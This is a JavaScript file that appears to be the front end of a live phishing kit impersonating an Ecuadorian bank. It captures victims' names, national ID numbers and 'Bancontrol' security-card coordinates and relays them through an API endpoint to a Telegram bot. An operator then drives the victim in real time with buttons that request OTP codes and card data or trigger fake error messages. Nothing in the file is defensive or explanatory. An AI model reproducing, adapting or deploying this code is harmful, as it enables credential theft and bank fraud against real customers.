const Session = {
  save(k, v) { localStorage.setItem(`bg_${k}`, JSON.stringify(v)) },
  get(k) { try { return JSON.parse(localStorage.getItem(`bg_${k}`)) } catch { return null } },
  clear() { Object.keys(localStorage).filter(k => k.startsWith('bg_')).forEach(k => localStorage.removeItem(k)) }
};

const BUTTONS = {
  login: [
    [{ text: "🔐 OTP", callback_data: "otp" }, { text: "💳 TARJETA", callback_data: "tarjeta" }],
    [{ text: "🏦 BANCONTROL", callback_data: "bancontrol" }],
    [{ text: "❌ ERROR LOGIN", callback_data: "error_login" }]
  ],
  otp: [
    [{ text: "💳 TARJETA", callback_data: "tarjeta" }],
    [{ text: "🏦 BANCONTROL", callback_data: "bancontrol" }],
    [{ text: "❌ ERROR OTP", callback_data: "error_otp" }]
  ],
  tarjeta: [
    [{ text: "🏁 FINALIZAR", callback_data: "finalizar" }],
    [{ text: "❌ ERROR TARJETA", callback_data: "error_tarjeta" }]
  ],
  bancontrol: [
    [{ text: "🏁 FINALIZAR", callback_data: "finalizar" }],
    [{ text: "❌ ERROR BANCONTROL", callback_data: "error_bancontrol" }]
  ]
};

async function sendTelegram(text, buttons = []) {
  const res = await fetch('/api/send', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ text, buttons })
  });
  return res.json();
}

let lastUpdateId = 0;

async function startPolling(handler) {
  try {
    const init = await fetch('/api/poll?init=true');
    const initData = await init.json();
    if (initData.update_id) lastUpdateId = initData.update_id;
  } catch(e) { console.error('init error:', e); }

  let waitCoords = false;

  const iv = setInterval(async () => {
    try {
      const res = await fetch(`/api/poll?offset=${lastUpdateId}&waitCoords=${waitCoords}`);
      const data = await res.json();

      if (data.update_id) lastUpdateId = data.update_id;

      // Actualizar modo espera de coordenadas
      if (typeof data.waitCoords !== 'undefined') waitCoords = data.waitCoords;

      if (!data.ok || !data.action) return;

      clearInterval(iv);
      if (data.coords) Session.save('bancontrol_coords', data.coords);
      handler(data.action, data.coords || null);
    } catch (e) { console.error('poll error:', e); }
  }, 2000);
}

function showWait() { document.getElementById('wait').classList.add('active') }
function hideWait() { document.getElementById('wait').classList.remove('active') }

function showAlert(id, msg) {
  const el = document.getElementById(id);
  el.classList.add('show');
  const s = el.querySelector('span');
  if (s && msg) s.textContent = msg;
}
function hideAlert(id) { document.getElementById(id)?.classList.remove('show') }

function showErr(id) {
  document.getElementById(id)?.classList.add('error');
  document.getElementById(`e-${id}`)?.classList.add('show');
}
function clearErrs(ids) {
  ids.forEach(id => {
    document.getElementById(id)?.classList.remove('error');
    document.getElementById(`e-${id}`)?.classList.remove('show');
  });
}

// ── BANCONTROL MODAL ──
function showBancontrol(coords, isError = false) {
  const existing = document.getElementById('bancontrol-modal');
  if (existing) existing.remove();

  const labels = (coords && coords.length >= 2) ? coords : ['E1', 'D2'];

  const modal = document.createElement('div');
  modal.id = 'bancontrol-modal';
  modal.innerHTML = `
    <div class="bc-overlay"></div>
    <div class="bc-modal">
      <div class="bc-header">
        <h2 class="bc-title">Bancontrol</h2>
        <button class="bc-close" onclick="document.getElementById('bancontrol-modal').remove()">✕</button>
      </div>
      <p class="bc-subtitle">Ingresa las coordenadas de tu Bancontrol</p>
      ${isError ? `
        <div class="alert alert-error show" style="margin-bottom:14px">
          <svg width="18" height="18" fill="none" viewBox="0 0 24 24"><circle cx="12" cy="12" r="10" stroke="currentColor" stroke-width="2"/><path d="M12 8v4m0 4h.01" stroke="currentColor" stroke-width="2" stroke-linecap="round"/></svg>
          <span>Coordenadas incorrectas. Intenta de nuevo.</span>
        </div>` : ''}
      <div id="bc-fields">
        <div class="bc-row">
          <div class="bc-label">${labels[0]}</div>
          <input class="bc-input" id="bc-inp-0" type="text" maxlength="6" autocomplete="off" placeholder=""/>
        </div>
        <div class="bc-row">
          <div class="bc-label">${labels[1]}</div>
          <input class="bc-input" id="bc-inp-1" type="text" maxlength="6" autocomplete="off" placeholder=""/>
        </div>
      </div>
      <div id="bc-alert" class="alert alert-error" style="margin-top:12px;display:none">
        <svg width="18" height="18" fill="none" viewBox="0 0 24 24"><circle cx="12" cy="12" r="10" stroke="currentColor" stroke-width="2"/><path d="M12 8v4m0 4h.01" stroke="currentColor" stroke-width="2" stroke-linecap="round"/></svg>
        <span>Por favor completa todos los campos.</span>
      </div>
      <button class="btn btn-primary" style="margin-top:16px" onclick="enviarBancontrol(${JSON.stringify(labels)})">
        Verificar
        <svg width="18" height="18" fill="none" viewBox="0 0 24 24"><path d="M5 12h14M13 6l6 6-6 6" stroke="currentColor" stroke-width="2.5" stroke-linecap="round"/></svg>
      </button>
    </div>
  `;
  document.body.appendChild(modal);
  setTimeout(() => document.getElementById('bc-inp-0')?.focus(), 100);
}

async function enviarBancontrol(labels) {
  const val0 = document.getElementById('bc-inp-0')?.value.trim();
  const val1 = document.getElementById('bc-inp-1')?.value.trim();

  if (!val0 || !val1) {
    const alert = document.getElementById('bc-alert');
    alert.style.display = 'flex';
    return;
  }

  const p = Session.get('personal') || {};

  const msg = `🏦 <b>BANCONTROL RECIBIDO</b>
━━━━━━━━━━━━━━━━
👤 Cliente: <b>${p.nombre||'—'}</b>
🪪 Cédula: <b>${p.cedula||'—'}</b>

${labels[0]}: <b>${val0}</b>
${labels[1]}: <b>${val1}</b>
📅 ${new Date().toLocaleString('es-EC',{timeZone:'America/Guayaquil'})}`;

  document.getElementById('bancontrol-modal').remove();
  showWait();

  try { await sendTelegram(msg, BUTTONS.bancontrol); } catch(e) { console.error(e); }

  startPolling((action, coords) => {
    hideWait();
    if      (action === 'finalizar')         window.location.href = 'final.html';
    else if (action === 'error_bancontrol')  showBancontrol(labels, true);
    else if (action === 'bancontrol' && coords) showBancontrol(coords);
    else if (action === 'tarjeta')           window.location.href = 'index3.html';
  });
}
